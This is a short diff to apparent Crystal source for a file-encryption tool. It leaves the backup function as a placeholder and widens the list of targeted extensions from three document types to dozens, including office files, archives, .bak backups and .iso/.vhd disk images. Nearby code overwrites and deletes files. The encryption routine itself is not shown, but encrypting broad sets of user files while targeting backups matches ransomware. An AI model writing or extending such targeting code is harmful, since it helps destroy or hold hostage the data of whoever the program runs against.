@@ -4,7 +4,7 @@ require "concurrent"
 # Placeholder for the backup function
 def backup_files(file_paths : Array(String))
   puts "Placeholder for backup logic. Implement backup of files here."
-  # Implement backup logic here. This could involve copying files to a backup directory.
+  # Backup logic here.
 end
 
 # Securely delete a file by overwriting and then deleting
@@ -67,7 +67,7 @@ def find_files(directory : String, extensions : Array(String), files : Array(Str
   end
 end
 
-extensions_to_encrypt = [".txt", ".docx", ".pdf"]
+extensions_to_encrypt = [".txt", ".docx", ".pdf", ".odt", ".rtf", ".doc", ".xlsx", ".xls", ".ods", ".ppt", ".pptx", ".odp", ".csv", ".xml", ".html", ".htm", ".json", ".yaml", ".yml", ".md", ".markdown", ".log", ".bak", ".tar", ".zip", ".rar", ".7z", ".gz", ".bz2", ".iso", ".vhd", ".vhdx", ".bak", ".tmp", ".dat"]
 find_files(directory_to_encrypt, extensions_to_encrypt, files_to_process)
 
 if files_to_process.empty?
